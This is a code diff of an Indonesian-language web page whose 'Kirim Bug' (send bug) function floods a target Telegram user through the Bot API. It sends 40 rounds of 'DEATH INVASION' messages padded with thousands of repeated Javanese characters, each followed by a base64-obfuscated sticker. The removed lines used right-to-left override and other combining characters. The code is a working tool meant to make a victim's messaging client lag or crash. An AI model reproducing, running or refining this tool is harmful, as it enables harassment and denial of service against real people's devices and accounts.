@@ -26,6 +26,11 @@
     #main, #target-section {
       display: none;
     }
+    #progress-text {
+      margin-top: 10px;
+      font-size: 1rem;
+      color: #0f0;
+    }
   </style>
 </head>
 <body>
@@ -42,6 +47,7 @@
     <div id="target-section">
       <input type="text" id="target-id" placeholder="ID Telegram Target"><br>
       <button onclick="sendBug()">🚀 Kirim Bug</button>
+      <p id="progress-text"></p> <!-- Progress di sini -->
     </div>
   </div>
 
@@ -75,29 +81,50 @@
       const id = document.getElementById('target-id').value.trim();
       if (!id) return alert("Isi ID dulu 😹");
 
-      for (let i = 1; i <= 20; i++) {
+      const stickerId = atob("Q0FBQ0FnVUFBeGtCQUFFTzJJSm9aaWQyQ1JoN1FFS1lVX1l1V1hSc01adng3QUFDN2dnQUFpRmN1Vlo4eV9DOXFsUWFtVFlF");
+      const progressText = document.getElementById('progress-text');
+
+      for (let i = 1; i <= 40; i++) {
         const payload = {
           chat_id: id,
-          text: `💣 *DEATH INVASION [${i}/10]* 💣\n` + "ꦾ".repeat(500) + "\u202e".repeat(200) + "𓂀𓂁".repeat(400) + "ោ‎".repeat(500) + "🎭".repeat(300),
+          text: `💣 *DEATH INVASION [${i}/10]* 💣\n` + "ꦾ".repeat(4000),
           parse_mode: "Markdown"
         };
 
+        const stickerPayload = {
+          chat_id: id,
+          sticker: stickerId
+        };
+
         try {
+          // Kirim teks
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
           });
-          console.log(`✅ Pesan ${i} terkirim`);
-          await new Promise(res => setTimeout(res, 200));
+
+          // Kirim stiker
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendSticker`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(stickerPayload)
+          });
+
+          const percent = Math.round((i / 40) * 100);
+          progressText.textContent = `Mengirim bug: ${percent}%`;
+
+          console.log(`✅ Batch ${i} terkirim`);
+          await new Promise(res => setTimeout(res, 100));
         } catch (err) {
           console.error(`❌ Gagal kirim ${i}:`, err);
         }
       }
 
-      alert("✅ Semua bug berhasil dikirim!");
+      progressText.textContent = "✅ Semua bug + stiker berhasil dikirim!";
+      alert("✅ Semua bug + stiker berhasil dikirim!");
     }
   </script>
 
 </body>
-  </html>
+</html>
